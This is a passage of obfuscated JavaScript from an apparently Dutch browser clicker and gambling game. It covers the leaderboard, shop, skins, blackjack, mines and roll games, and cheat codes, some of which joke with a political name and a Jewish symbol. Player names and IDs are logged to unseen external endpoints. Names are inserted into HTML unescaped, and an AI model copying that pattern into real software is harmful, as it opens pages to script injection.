bQ=bl['length'];bQ<0x5;bQ++)bp+='<div\x20class=\x22lb-row\x22><span\x20class=\x22lb-rank\x22>#'+(bQ+0x1)+'</span><span\x20class=\x22lb-name\x22\x20style=\x22color:var(--muted)\x22>???</span><span\x20class=\x22lb-score\x22\x20style=\x22color:var(--muted)\x22>???</span></div>';if(!bw)bp+='<hr\x20class=\x22lb-separator\x22>'+E7(bW,bS[bW-0x1]['name'],bS[bW-0x1]['score'],!![],![]);Kg['innerHTML']=bp,Kz['textContent']=(K1?'▼':'▲')+'\x20Leaderboard\x20('+bS['length']+')',q('lbVersionBadge')['textContent']='v'+K0,q('lbPrevBtn')['style']['display']=K0===K?'inline-block':'none',q('lbNextBtn')['style']['display']=K0==='2.1'?'inline-block':'none';if(K1)E9(bS,bW);}function E9(bS,bW){const bl=Kq['scrollTop'];q('lbModalCount')['textContent']=bS['length']+'\x20spelers',Kq['innerHTML']=bS['map']((bw,bp)=>E7(bp+0x1,bw['name'],bw['score'],bw['isMe'],!![]))['join'](''),bl>0x0&&(Kq['scrollTop']=bl);}function EK(){K1=!![],Kj['style']['display']='flex',Kb['add']('lbModal');const bS=E6(),bW=bS['findIndex'](bl=>bl['isMe'])+0x1;E9(bS,bW),Kz['textContent']='▼\x20Leaderboard\x20('+bS['length']+')';}function EE(){K1=![],Kj['style']['display']='none',Kb['delete']('lbModal');}function Eb(){Y['score']=x(Y['score']),Y['basePerClick']=x(Y['basePerClick']),Y['perSecond']=x(Y['perSecond']),KN();if(Y['score']>Y['highest'])Y['highest']=Y['score'];const bS=Date['now']()<Ka['ps']?x(Y['perSecond']*2.5):Y['perSecond'];KW['innerText']='Lantings:\x20'+T(Y['score']),KW['style']['animation']='none',void KW['offsetWidth'],KW['style']['animation']='scoreFlash\x20.3s\x20ease',Kp['innerText']='Per\x20klik:\x20'+Y['perClick'],KQ['innerText']='Per\x20seconde:\x20'+bS,q('rollMoney')['innerText']=d(Y['score']),q('bjMoney')['innerText']=d(Y['score']),q('minesMoney')['innerText']=d(Y['score']),q('shopMoney')['innerText']=d(Y['score']),q('statTime')['innerText']=Y['playTime'],q('statEarned')['innerText']=d(Y['earned']),q('statLost')['innerText']=d(Y['lost']),q('statNet')['innerText']=d(Y['highest']),q('statClicks')['innerText']=d(Y['totalClicks']),q('displayUserId')['innerText']=Y['uid'],q('displayUserName')['innerText']=Y['name'],E8(),Ea(),ED(),El(),KO(),Ew(),E3(),Kv();}function Ea(){const bS=Date['now'](),bW=[];if(bS<Ka['click'])bW['push']('<div\x20class=\x22boost-badge\x20click-boost\x22>+20%\x20Klik\x20('+x((Ka['click']-bS)/0x3e8)+'s)</div>');if(bS<Ka['ps'])bW['push']('<div\x20class=\x22boost-badge\x20ps-boost\x22>x2.5\x20P/S\x20('+x((Ka['ps']-bS)/0x3e8)+'s)</div>');if(bS<Ka['doubleClick'])bW['push']('<div\x20class=\x22boost-badge\x20click-boost\x22>2x\x20Klik\x20('+x((Ka['doubleClick']-bS)/0x3e8)+'s)</div>');if(bS<Ka['shopDiscount'])bW['push']('<div\x20class=\x22boost-badge\x22>Shop\x2020%\x20korting\x20('+x((Ka['shopDiscount']-bS)/0x3e8)+'s)</div>');const bl=KC();if(bl>0x0)bW['push']('<div\x20class=\x22boost-badge\x22>Luck\x20+'+bl+'%</div>');Kn['innerHTML']=bW['join']('');}function ED(){Ks['disabled']=!Y['unlockedGamble'];const bS=bl=>bl?'':'Vergrendeld',bW=bl=>'gamble-card'+(bl?'':'\x20locked-game');q('bjLockText')['innerText']=bS(Y['unlockedBlackjack']),q('rollsLockText')['innerText']=bS(Y['unlockedRolls']),q('minesLockText')['innerText']=bS(Y['unlockedMines']),q('openBlackjackBtn')['className']=bW(Y['unlockedBlackjack']),q('openRollsBtn')['className']=bW(Y['unlockedRolls']),q('openMinesBtn')['className']=bW(Y['unlockedMines']);}function EH(){return Math['max'](0x1,x(Y['score']*0.1));}function Eo(bS,bW){const bl=Math['max'](0x1,x(bW*0.1));if(isNaN(bS)||bS<bl)return M('Minimale\x20inzet\x20is\x20'+d(bl)+'\x20Lantings','var(--danger)'),![];if(bS>bW)return M('Niet\x20genoeg\x20Lantings','var(--danger)'),![];return!![];}function EU(bS){q(bS)['value']=EH(),M('Minimale\x20inzet\x20ingevuld','var(--accent2)');}function Eu(bS){const bW=K3[bS]||0x0;if(Date['now']()<bW){const bl=Math['ceil']((bW-Date['now']())/0x3e8),bw=0x2710+(0x3c-bl)*0x3e8;if(bl>0x3&&Y['score']>=bw){if(confirm('Cooldown:\x20'+bl+'s.\x20Koop\x20'+(bl-0x3)+'\x20seconden\x20voor\x20'+d(bw)+'\x20Lantings?'))return Y['score']-=bw,Y['lost']+=bw,K3[bS]=Date['now']()+(bl-0x3)*0x3e8,Eb(),!![];}return M('Cooldown\x20actief\x20('+bl+'s)','var(--danger)'),![];}return!![];}function ES(bS){K3[bS]=Date['now']()+0xea60;}function EW(bS,bW){const bl=bW['scoreBefore']>0x0?Math['round'](bW['bet']/bW['scoreBefore']*0x64):0x64;let bw='🎰\x20**Gamble**\x20|\x20'+Y['name']+'\x20(ID:'+Y['uid']+')\x0aSpel:\x20**'+bS+'**\x0aInzet:\x20**'+d(bW['bet'])+'**\x20('+bl+'%\x20van\x20vermogen)\x0a';if(bW['result'])bw+='Resultaat:\x20**'+bW['result']+'**\x0a';if(bW['extra'])bw+=bW['extra'];e(p['gamble'],bw);}function El(){KI['innerText']=Y['keybindDisplay']||'ENTER';const bS=Y['score']>=S;q('kb1CostLabel')['innerText']='Wijzigen:\x20'+T(S),q('kb1CostLabel')['style']['color']=bS?'var(--accent2)':'var(--danger)';if(Y['unlockedKeybind2'])q('kb2Row')['style']['opacity']='1',KZ['innerText']=Y['keybind2Display']||'—',q('kb2CostLabel')['innerText']='Wijzigen:\x20'+T(S),q('kb2CostLabel')['style']['color']=Y['score']>=S?'var(--accent2)':'var(--danger)';else{q('kb2Row')['style']['opacity']='0.4',KZ['innerText']='Ontgrendel\x20('+T(W)+')';const bW=Y['score']>=W;q('kb2CostLabel')['innerText']=bW?'✓\x20Kan\x20ontgrendelen':T(W-Y['score'])+'\x20tekort',q('kb2CostLabel')['style']['color']=bW?'var(--accent2)':'var(--danger)';}}function Ew(){const bS=0x2bf20-(Date['now']()-K7);if(K7>0x0&&bS>0x0){const bW=Math['ceil'](bS/0x3e8);KT['textContent']='Cooldown\x20('+bW+'s)',KT['classList']['add']('cooldown'),KT['disabled']=!![];}else KT['textContent']='Suggestion',KT['classList']['remove']('cooldown'),KT['disabled']=![];}let Ep=![];function EQ(bS){if(Ep)return;Ep=!![],KL(!!bS),V('safe'),Y['score']+=Y['perClick'],Y['earned']+=Y['perClick'],Y['totalClicks']++;if(Kk()>=0xa)E0('s_click_1s');Eb(),F('+'+Y['perClick'],'#00e5b0'),setTimeout(()=>{Ep=![];},0x28);}function Ei(){Kw['style']['transform']='scale(0.97)',Kw['style']['boxShadow']='0\x200\x2020px\x20rgba(124,92,252,.9)\x20inset',setTimeout(()=>{Kw['style']['transform']='',Kw['style']['boxShadow']='';},0x64);}function EG(){if(K8||q('startScreen')['style']['display']!=='none')return;K8=!![],Kx['src']=KY(),KP['style']['left']=P(Math['random']()*(window['innerWidth']-0x50)+0x14)+'px',KP['style']['top']='0px',KP['style']['display']='block',Ke['style']['display']='block';let bS=0x5;Ke['innerText']='Vang\x20hem!\x20'+bS+'s';const bW=Date['now']();function bl(){const bw=(Date['now']()-bW)/0x3e8;KP['style']['transform']='translateY('+bw*0x46+'px)\x20rotate('+bw*0xb4+'deg)';if(bw<0x5)K9=requestAnimationFrame(bl);}K9=requestAnimationFrame(bl),KK=setInterval(()=>{bS--,Ke['innerText']='Vang\x20hem!\x20'+bS+'s';if(bS<=0x0)Es();},0x7d0),KP['onclick']=()=>{Es();const bw=['click','ps','gamble','shop'],bp=bw[P(Math['random']()*bw['length'])];KX(bp);const bQ={'click':'Klik\x20boost:\x20+20%','ps':'P/S\x20boost:\x20x2.5','gamble':'Gamble\x20geluk\x20boost!','shop':'Shop\x2020%\x20korting!'};F(bQ[bp],'#ffd700'),E0('s_falling_catch');};}function Es(){cancelAnimationFrame(K9),clearInterval(KK),KP['style']['display']='none',Ke['style']['display']='none',KP['onclick']=null,K8=![],KE=Date['now']()+0xea60;}function EI(){const bS=q('unlockTiles'),bW={'gamble':Y['unlockedGamble'],'blackjack':Y['unlockedBlackjack'],'rolls':Y['unlockedRolls'],'mines':Y['unlockedMines']};let bl='<div\x20class=\x22sec-label\x22>Ontgrendelen</div>';Z['forEach'](bw=>{const bp=bW[bw['key']],bQ=Y['score']>=bw['cost'],bi=bp?'<button\x20class=\x22unlock-btn-unlocked\x22\x20disabled>Ontgrendeld</button>':'<button\x20class=\x22'+(bQ?'buy-btn-can':'buy-btn-cannot')+'\x22\x20data-ukey=\x22'+bw['key']+'\x22\x20'+(bQ?'':'disabled')+'>'+d(bw['cost'])+'</button>';bl+='<div\x20class=\x22unlock-tile'+(bp?'\x20unlocked-tile':'')+'\x22><div\x20class=\x22unlock-info\x22><div\x20class=\x22upgrade-val\x22>'+bw['label']+'</div><div\x20class=\x22unlock-desc\x22>'+bw['desc']+'</div></div>'+bi+'</div>';}),bl+='<div\x20class=\x22sec-label\x22>Upgrades</div>',bS['innerHTML']=bl,bS['querySelectorAll']('button[data-ukey]')['forEach'](bw=>bw['addEventListener']('click',()=>{const bp=bw['dataset']['ukey'],bQ=Z['find'](bi=>bi['key']===bp);if(!bQ||Y['score']<bQ['cost'])return;Y['score']-=bQ['cost'],Y['lost']+=bQ['cost'];if(bp==='gamble')Y['unlockedGamble']=!![];if(bp==='blackjack')Y['unlockedBlackjack']=!![];if(bp==='rolls')Y['unlockedRolls']=!![];if(bp==='mines')Y['unlockedMines']=!![];E0('gamble_first'),Eb(),EI(),EZ();}));}function EZ(){let bS='';const bW=0x14,bl=Date['now']()<Ka['shopDiscount'];Y['upgrades']['slice'](0x0,bW)['forEach']((bw,bp)=>{const bQ=bp===0x0||Y['upgrades'][bp-0x1]['bought'];bw['cost']=P(bw['cost']);const bi=bl?P(bw['cost']*0.8):bw['cost'];if(!bQ){bS+='<div\x20class=\x22upgrade\x20locked\x22><div\x20class=\x22upgrade-info\x22><div\x20style=\x22color:var(--muted)\x22>???</div></div></div>';return;}const bG=bw['type']==='click'?'per\x20klik':'per\x20seconde',bs=bw['count']?'<span\x20class=\x22upgrade-count\x22>x'+bw['count']+'</span>':'',bI=Y['score']>=bi;bS+='<div\x20class=\x22upgrade\x22><div\x20class=\x22upgrade-info\x22><div><span\x20class=\x22upgrade-val\x22>+'+bw['value']+'</span></div><div\x20class=\x22upgrade-type\x22>'+bG+'</div></div><div\x20class=\x22upgrade-right\x22>'+bs+'<button\x20class=\x22'+(bI?'buy-btn-can':'buy-btn-cannot')+'\x22\x20data-upg=\x22'+bp+'\x22\x20'+(bI?'':'disabled')+'>'+d(bi)+'</button></div></div>';}),KG['innerHTML']=bS,KG['querySelectorAll']('button[data-upg]')['forEach'](bw=>bw['addEventListener']('click',()=>{const bp=parseInt(bw['dataset']['upg']),bQ=Y['upgrades'][bp];if(!bQ)return;const bi=Date['now']()<Ka['shopDiscount'],bG=bi?P(bQ['cost']*0.8):bQ['cost'];if(Y['score']<bG)return;Y['score']-=bG,Y['lost']+=bG,bQ['bought']=!![],bQ['count']=(bQ['count']||0x0)+0x1;if(bQ['type']==='click')Y['basePerClick']+=bQ['value'];else Y['perSecond']+=bQ['value'];bQ['cost']=P(bQ['cost']*1.6);if(bp===Y['upgrades']['length']-0x1||bp===bW-0x1){const bs=Y['upgrades']['length']%0x2===0x0;Y['upgrades']['push']({'type':bs?'click':'auto','value':0x1+P(Y['upgrades']['length']/0x2)*0x2,'cost':bs?0x1e*Math['pow'](1.6,Y['upgrades']['length']):0x14*Math['pow'](1.6,Y['upgrades']['length']),'bought':![]});}Eb(),EZ(),EI();}));}function En(){const bS=q('skinList'),bW=KR(),bl=q('skinCooldownInfo');if(bW>0x0){const bw=Math['ceil'](bW/0xea60),bp=Math['ceil'](bW%0xea60/0x3e8);bl['innerText']='Skin\x20wissel\x20cooldown:\x20nog\x20'+bw+'m\x20'+bp+'s.';}else bl['innerText']='Je\x20kunt\x20van\x20skin\x20wisselen.';bS['innerHTML']=s['map'](bQ=>{const bi=Y['ownedSkins']['includes'](bQ['id']),bG=Y['equippedSkin']===bQ['id'],bs=bQ['img']?'<img\x20src=\x22'+bQ['img']+'\x22\x20onerror=\x22this.style.display=\x27none\x27\x22>':'<div\x20style=\x22width:70px;height:70px;background:var(--card);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;color:var(--muted);margin:auto;\x22>Binnenkort</div>';let bI;if(bi&&bG)bI='<button\x20class=\x22ownedBtn\x22\x20disabled>Uitgerust</button>';else{if(bi)bI='<button\x20class=\x22equipBtn\x22\x20data-sid=\x22'+bQ['id']+'\x22>'+(bW>0x0?'Cooldown':'Equip')+'</button>';else{if(bQ['free'])bI='<button\x20class=\x22buyBtn\x22\x20data-sid=\x22'+bQ['id']+'\x22>Gratis</button>';else{if(!bQ['img'])bI='<button\x20class=\x22ownedBtn\x22\x20disabled>Binnenkort</button>';else bI='<button\x20class=\x22buyBtn\x22\x20data-sid=\x22'+bQ['id']+'\x22>Koop\x20('+d(bQ['cost'])+')</button>';}}}return'<div\x20class=\x22skinBox'+(bG?'\x20skinEquipped':'')+'\x22><div>'+bs+'</div><div\x20class=\x22skinName\x22>'+bQ['name']+'</div><div\x20class=\x22skinCost\x22>'+(bQ['cost']>0x0?d(bQ['cost'])+'\x20Lantings':'Gratis')+'</div><div\x20class=\x22skinBonus\x22>'+bQ['bonusText']+'</div>'+bI+'</div>';})['join'](''),bS['querySelectorAll']('button[data-sid]')['forEach'](bQ=>bQ['addEventListener']('click',()=>{const bi=parseInt(bQ['dataset']['sid']),bG=s['find'](bs=>bs['id']===bi);if(!bG)return;if(Y['ownedSkins']['includes'](bi)){if(Y['equippedSkin']===bi)return;const bs=KR();if(bs>0x0){const bI=Math['ceil'](bs/0xea60),bZ=Math['ceil'](bs%0xea60/0x3e8);M('Skin\x20wissel\x20cooldown:\x20nog\x20'+bI+'m\x20'+bZ+'s.','var(--danger)');return;}Eg(bi),Km();return;}if(bG['free']){Y['ownedSkins']['push'](bi),Eg(bi),Km(),En(),E0('buy_skin');return;}if(Y['score']<bG['cost']){M('Niet\x20genoeg\x20Lantings','var(--danger)');return;}Y['score']-=bG['cost'],Y['lost']+=bG['cost'],Y['ownedSkins']['push'](bi),Eg(bi),Km(),E0('buy_skin'),Eb(),En();}));}function Eg(bS){if(!Y['ownedSkins']['includes'](bS))return;Y['equippedSkin']=bS,KN(),Kx['src']=KY(),Eb(),En();}const Ez=['H','D','K','S'],Ej=['A','2','3','4','5','6','7','8','9','10','J','Q','K'];let Eq=[],EP=[],Ex=[],Ee=![],ET=0x0,Ed=![],Ey=0x0;function EM(){Eq=[];for(const bS of Ez)for(const bW of Ej)Eq['push']({'rank':bW,'suit':bS});for(let bl=Eq['length']-0x1;bl>0x0;bl--){const bw=P(Math['random']()*(bl+0x1));[Eq[bl],Eq[bw]]=[Eq[bw],Eq[bl]];}}function EV(bS){if(bS['rank']==='A')return 0xb;if(['J','Q','K']['includes'](bS['rank']))return 0xa;return parseInt(bS['rank']);}function EF(bS){let bW=0x0,bl=0x0;for(const bw of bS){bW+=EV(bw);if(bw['rank']==='A')bl++;}while(bW>0x15&&bl-->0x0)bW-=0xa;return bW;}function Et(bS){const bW=bS['suit']==='H'||bS['suit']==='D';return'<span\x20style=\x22color:'+(bW?'#ff4f6d':'var(--text)')+'\x22>'+bS['rank']+bS['suit']+'</span>';}function Ev(bS,bW){return bS['map']((bl,bw)=>bW&&bw===0x0?'??':Et(bl))['join']('\x20');}function ER(){const bS=EF(EP),bW=EF(Ex);q('bjGame')['innerHTML']='<div\x20style=\x22margin:30px\x200;\x22><div\x20class=\x22bj-label\x22>Dealer</div><div\x20class=\x22bj-hand\x22>'+Ev(Ex,Ee)+'\x20('+(Ee?'?':bW)+')</div><div\x20class=\x22bj-label\x22\x20style=\x22margin-top:20px;\x22>Jij</div><div\x20class=\x22bj-hand\x22>'+Ev(EP,![])+'\x20('+bS+')</div></div><div\x20class=\x22bj-buttons\x22>'+(Ee?'<button\x20id=\x22hitBtn\x22>Pak</button><button\x20id=\x22standBtn\x22>Stop</button>':'<button\x20id=\x22newBJGameBtn\x22>Opnieuw</button>')+'</div><div\x20class=\x22bj-result\x22\x20id=\x22bjResult\x22></div>',Ee?(q('hitBtn')['onclick']=EJ,q('standBtn')['onclick']=Eh):q('newBJGameBtn')['onclick']=EC;}function Em(bS){if(!Eu('blackjack'))return;const bW=Y['score'],bl=bS!==undefined?bS:parseInt(q('betInput')['value']);if(!Eo(bl,bW))return;Ey=bW,Ed=bl===bW,ET=bl,Y['score']-=bl,Y['lost']+=bl;if(Y['score']<0xc8)E0('s_gamble_broke');EM(),EP=[Eq['pop'](),Eq['pop']()],Ex=[Eq['pop'](),Eq['pop']()],Ee=!![],ER(),ES('blackjack'),EW('Blackjack',{'bet':bl,'scoreBefore':Ey,'result':'Gestart','extra':'All-in:\x20'+(Ed?'Ja':'Nee')}),Eb();}function EJ(){if(!Ee)return;EP['push'](Eq['pop']());if(EF(EP)>0x15)EB(![]);else ER();}function Eh(){if(!Ee)return;Ee=![];while(EF(Ex)<0x11)Ex['push'](Eq['pop']());const bS=EF(EP),bW=EF(Ex);let bl;if(bS>0x15)bl=![];else{if(bW>0x15)bl=!![];else{if(bS===0x15&&EP['length']===0x2&&!(bW===0x15&&Ex['length']===0x2))bl=!![];else{if(bS>bW)bl=!![];else{if(bS===bW)bl=null;else bl=![];}}}}EB(bl);}function EB(bS){Ee=![];if(bS===![]){if(Ed){const bp=Math['min'](0.1,KC()/0x64);Math['random']()<0.55+bp&&(bS=!![],E0('s_allin_win'));}}let bW,bl;if(bS===!![]){const bQ=EP['length']===0x2&&EF(EP)===0x15?0x3:0x2,bi=Math['max'](0x0,P(ET*bQ));Y['score']+=bi,Y['earned']+=bi,bW='Gewonnen!\x20+'+d(bi),bl='var(--accent2)',V('win'),E0('win_blackjack'),EW('Blackjack',{'bet':ET,'scoreBefore':Ey,'result':'GEWONNEN\x20+'+d(bi),'extra':'Dealer:\x20'+EF(Ex)+'\x20|\x20Speler:\x20'+EF(EP)});}else{if(bS===![]){bW='Verloren!',bl='var(--danger)',V('lose');if(Ed&&Ey>=Y['highest']&&Y['score']===0x0)E0('s_lose_all');EW('Blackjack',{'bet':ET,'scoreBefore':Ey,'result':'VERLOREN','extra':'Dealer:\x20'+EF(Ex)+'\x20|\x20Speler:\x20'+EF(EP)});}else Y['score']+=ET,bW='Gelijkspel!\x20Inzet\x20terug.',bl='var(--gold)',EW('Blackjack',{'bet':ET,'scoreBefore':Ey,'result':'GELIJKSPEL','extra':'Dealer:\x20'+EF(Ex)+'\x20|\x20Speler:\x20'+EF(EP)});}ER();const bw=q('bjResult');bw['innerText']=bW,bw['style']['color']=bl,Eb();}function EC(){EP=[],Ex=[],Ee=![],ET=0x0,Ed=![],q('betInput')['value']='',ER();}function Ec(bS){const bW=[0.1,0.25,0.5,0.75],bl=[1.25,1.5,0x2,2.5,0x3],bw=[0x1],bp=Math['random'](),bQ=0.39,bi=Math['min'](0.3,bS/0x64),bG=bQ+bi,bs=0.1;if(bp<bs)return bw[P(Math['random']()*bw['length'])];if(bp<bs+bG)return bl[P(Math['random']()*bl['length'])];return bW[P(Math['random']()*bW['length'])];}function EX(bS){return bS<0x1?'bad':bS===0x1?'neutral':'good';}function Er(bS){if(!Eu('rolls'))return;const bW=bS&&bS['allIn'],bl=Y['score'],bw=bS&&bS['bet']!==undefined?bS['bet']:parseInt(q('rollBet')['value']);if(!Eo(bw,bl))return;Y['score']-=bw,Y['lost']+=bw;if(Y['score']<0xc8)E0('s_gamble_broke');const bp=Math['min'](0x5,Math['max'](0x3,parseInt(q('rollCount')['value'])||0x3)),bQ=KC()+(bW?0xa:0x0),bi=Array['from']({'length':bp},()=>Ec(bQ)),bG=bw/bp,bs=Math['max'](0x0,x(bi['reduce']((bZ,bn)=>bZ+bG*bn,0x0)));Y['score']+=bs,Y['earned']+=bs;const bI=bs>=bw;if(bI)E0('win_rolls');q('rollResult')['innerHTML']='<div\x20class=\x22roll-grid\x22>'+bi['map'](bZ=>'<div\x20class=\x22rollMult\x20'+EX(bZ)+'\x22>'+bZ+'x</div>')['join']('')+'</div><div\x20class=\x22roll-total\x22>Totaal:\x20'+d(bs)+'\x20Lantings</div>',q('rollMeta')['innerText']='Luck:\x20+'+bQ+'%',ES('rolls'),V(bI?'win':'lose'),EW('Rolls',{'bet':bw,'scoreBefore':bl,'result':(bI?'GEWONNEN':'VERLOREN')+'\x20'+d(bs),'extra':'Multipliers:\x20'+bi['join'](',\x20')+'\x20|\x20Rolls:\x20'+bp+'\x20|\x20Luck:\x20+'+bQ+'%'}),Eb();}let EY={'active':![],'size':0x5,'mines':0x3,'bet':0x0,'multiplier':0x1,'safe':0x0,'bombSet':new Set(),'opened':new Set(),'scoreBefore':0x0};function EN(bS,bW,bl){const bw=bW/(bS*bS),bp=0x1+bl/0x64*0.12;return Math['max'](0.00003,Math['pow'](bw,3.2)*0x12)*bp;}function EL(){const bS=q('minesBoard');bS['style']['gridTemplateColumns']='repeat('+EY['size']+',1fr)';const bW=EY['size']*EY['size'],bl=document['createDocumentFragment']();for(let bw=0x0;bw<bW;bw++){const bp=document['createElement']('button');bp['className']='mine-tile',bp['dataset']['idx']=String(bw),bp['textContent']='?',bp['addEventListener']('click',()=>Ef(bw)),bl['appendChild'](bp);}bS['innerHTML']='',bS['appendChild'](bl);}function Ek(bS){if(!Eu('mines'))return;const bW=bS&&bS['allIn'],bl=Y['score'],bw=bS&&bS['bet']!==undefined?bS['bet']:parseInt(q('minesBet')['value']);if(!Eo(bw,bl))return;const bp=Math['min'](0xa,Math['max'](0x5,parseInt(q('minesSize')['value'])||0x5)),bQ=Math['max'](0x1,Math['min'](bp*bp-0x1,parseInt(q('minesCount')['value'])||0x1));if(bW)Kc(0x4e20);const bi=KC()+(bW?0xa:0x0),bG=Math['max'](0x1,bQ-P(bQ*(bi/0x64)*0.1));Y['score']-=bw,Y['lost']+=bw;if(Y['score']<0xc8)E0('s_gamble_broke');EY={'active':!![],'size':bp,'mines':bG,'bet':bw,'multiplier':0x1,'safe':0x0,'bombSet':new Set(),'opened':new Set(),'scoreBefore':bl};while(EY['bombSet']['size']<bG)EY['bombSet']['add'](P(Math['random']()*bp*bp));EL();const bs=q('minesStatus');bs['style']['color']='var(--muted)',bs['innerText']='Spel\x20gestart.\x20Luck:\x20+'+bi+'%\x20|\x20Grid:\x20'+bp+'x'+bp+'\x20|\x20Mijnen:\x20'+bG,ES('mines'),EW('Mines',{'bet':bw,'scoreBefore':bl,'result':'Gestart','extra':'Grid:\x20'+bp+'x'+bp+'\x20|\x20Mijnen:\x20'+bG+'\x20|\x20Luck:\x20+'+bi+'%\x20|\x20All-in:\x20'+(bW?'Ja':'Nee')}),Eb();}function EA(bS,bW){const bl=q('minesBoard')['querySelector']('[data-idx=\x22'+bS+'\x22]');if(!bl)return;bl['disabled']=!![],bl['textContent']=bW?'💣':'💰',bl['classList']['add'](bW?'bomb':'safe');}function EO(bS,bW){EY['active']=![];for(let bw=0x0;bw<EY['size']*EY['size'];bw++)if(EY['bombSet']['has'](bw))EA(bw,!![]);const bl=q('minesStatus');bl['style']['color']=bS?'var(--accent2)':'var(--danger)',bl['innerText']=bW,V(bS?'win':'lose'),Eb();}function Ef(bS){if(!EY['active']||EY['opened']['has'](bS))return;EY['opened']['add'](bS);if(EY['bombSet']['has'](bS)){EA(bS,!![]),EW('Mines',{'bet':EY['bet'],'scoreBefore':EY['scoreBefore'],'result':'VERLOREN\x20(mijn\x20geraakt)','extra':'Safe\x20tiles:\x20'+EY['safe']+'\x20|\x20Multiplier:\x20x'+EY['multiplier']['toFixed'](0x4)}),EO(![],'Je\x20hebt\x20verloren');return;}EA(bS,![]),EY['safe']++;const bW=EN(EY['size'],EY['mines'],KC());EY['multiplier']*=0x1+bW;const bl=q('minesStatus');bl['style']['color']='var(--gold)',bl['innerText']='Multiplier:\x20x'+EY['multiplier']['toFixed'](0x4),V('safe');}function b0(){if(!EY['active'])return;const bS=Math['max'](0x0,x(EY['bet']*EY['multiplier']));Y['score']+=bS,Y['earned']+=bS,ES('mines'),E0('cashout_mines');if(bS>=EY['bet']*0x5)E0('s_mines_big_win');EW('Mines',{'bet':EY['bet'],'scoreBefore':EY['scoreBefore'],'result':'CASH\x20OUT\x20+'+d(bS),'extra':'Multiplier:\x20x'+EY['multiplier']['toFixed'](0x4)+'\x20|\x20Safe\x20tiles:\x20'+EY['safe']+'\x20|\x20Grid:\x20'+EY['size']+'x'+EY['size']}),EO(!![],'Cash\x20out!\x20+'+d(bS)+'\x20Lantings');}const b1=new Set(),b2={'gamble69':()=>{return KX('gamble'),E0('s_code_used'),e(p['codes'],'🔑\x20Code\x20gebruikt\x20|\x20'+Y['name']+'\x20(ID:'+Y['uid']+'):\x20gamble69'),{'msg':'Gamble\x20geluk\x20boost!\x20(20s)','color':'var(--accent2)'};},'netanyahu':()=>{return Ka['doubleClick']=Date['now']()+0xea60,KN(),Eb(),E0('s_code_used'),e(p['codes'],'🔑\x20Code\x20gebruikt\x20|\x20'+Y['name']+'\x20(ID:'+Y['uid']+'):\x20netanyahu'),{'msg':'2x\x20klikken\x20voor\x2060\x20seconden!','color':'var(--gold)'};},'shalom':()=>{return Ka['doubleClick']=Date['now']()+0x7530,KN(),Eb(),E0('s_code_used'),e(p['codes'],'🔑\x20Code\x20gebruikt\x20|\x20'+Y['name']+'\x20(ID:'+Y['uid']+'):\x20shalom'),{'msg':'✡\x202x\x20klikken\x20voor\x2030\x20seconden!','color':'var(--gold)'};},'freemoney':()=>{const bS=P(Y['score']*0.1);return Y['score']=Math['max'](0x0,Y['score']-bS),Y['lost']+=bS,Eb(),e(p['codes'],'🔑\x20Code\x20gebruikt\x20|\x20'+Y['name']+'\x20(ID:'+Y['uid']+'):\x20freemoney\x20(-10%)'),{'msg':'freemoney...\x20je\x20verloor\x2010%\x20van\x20je\x20geld!','color':'var(--danger)'};},'wlanting':()=>{const bS=P(Y['score']*0.15);return Y['score']+=bS,Y['earned']+=bS,Eb(),E0('s_code_used'),e(p['codes'],'🔑\x20Code\x20gebruikt\x20|\x20'+Y['name']+'\x20(ID:'+Y['uid']+'):\x20wlanting\x20(+15%)'),{'msg':'Wlanting!\x20+15%\x20geld!','color':'var(--accent2)'};}};function b3(){const bS=q('codeInput'),bW=q('codeMsg'),bl=bS['value']['trim']()['toLowerCase']();if(!bl)return;if(b1['has'](bl)){bW['style']['color']='var(--danger)',bW['innerText']='Code\x20al\x20gebruikt!';return;}if(b2[bl]){b1['add'](bl);const bw=b2[bl]();bW['style']['color']=bw['color'],bW['innerText']=bw['msg'],bS['value']='';}else bW['style']['color']='var(--danger)',bW['innerText']='Ongeldige\x20code.';}function b4(){const bS=localStorage['getItem'](H),bW=q('voteInfo');bW['style']['color']='var(--muted)',bW['innerText']=bS?'Jouw\x20stem:\x20'+bS:'Je\x20hebt\x20nog\x20niet\x20gestemd.';if(bS){const bl=document['querySelector']('input[name=\x22voteOption\x22][value=\x22'+bS+'\x22]');if(bl)bl['checked']=!![];}KJ('votePanel');}function b5(){const bS=document['querySelector']('input[name=\x27voteOption\x27]:checked');if(!bS){M('Kies\x20eerst\x20een\x20optie','var(--danger)');return;}const bW=bS['value'],bl=localStorage['getItem'](H);if(bl&&bl!==bW){M('Je\x20kan\x20maar\x201\x20keer\x20stemmen','var(--danger)');return;}if(!bl)localStorage['setItem'](H,bW),e(p['vote'],'vote\x20|\x20'+Y['name']+'\x20|\x20'+bW),M('Stem\x20verzonden:\x20'+bW,'var(--accent2)'),E0('s_vote');else M('Je\x20stem\x20staat\x20al\x20op:\x20'+bl,'var(--gold)');Kh('votePanel');}function b6(){const bS=q('suggestionInput'),bW=bS['value']['trim']();if(!bW)return;const bl=0x2bf20-(Date['now']()-K7);if(K7>0x0&&bl>0x0){M('Cooldown\x20actief,\x20wacht\x20tot\x20je\x20opnieuw\x20een\x20suggestie\x20kunt\x20sturen.','var(--danger)');return;}e(p['sugg'],Y['name']+':\x20'+bW),bS['value']='',Kh('suggestionPanel'),K7=Date['now'](),localStorage['setItem'](o,K7),E0('s_suggestion'),Ew(),M('Suggestion\x20verzonden','var(--accent2)');}function b7(){const bS=q('accList');bS['innerHTML']=X['map'](bW=>{const bl=bW['uid']===r;return'<div\x20class=\x22acc-row'+(bl?'\x20active-acc':'')+'\x22><div\x20class=\x22acc-info\x22><div\x20class=\x22acc-name\x22>'+bW['name']+(bl?'\x20✓':'')+'</div><div\x20class=\x22acc-id\x22>ID:\x20'+bW['uid']+'</div><div\x20class=\x22acc-score\x22>'+T(bW['score']||0x0)+'\x20Lantings</div></div>'+(!bl?'<button\x20class=\x22acc-switch-btn\x22\x20data-uid=\x22'+bW['uid']+'\x22>Switch</button>':'<span\x20style=\x27font-size:11px;color:var(--accent2);\x27>Actief</span>')+(!bl&&X['length']>0x1?'<button\x20class=\x22acc-del-btn\x22\x20data-uid=\x22'+bW['uid']+'\x22>✕</button>':'')+'</div>';})['join'](''),bS['querySelectorAll']('.acc-switch-btn')['forEach'](bW=>bW['addEventListener']('click',()=>{N(),r=bW['dataset']['uid'],B(r),Y=Object['assign']({},X['find'](bl=>bl['uid']===r)),Y['unlockedAch']=Y['unlockedAch']||{},Y['claimedAch']=Y['claimedAch']||{},Y['themesUsed']=Y['themesUsed']||[],Y['totalCl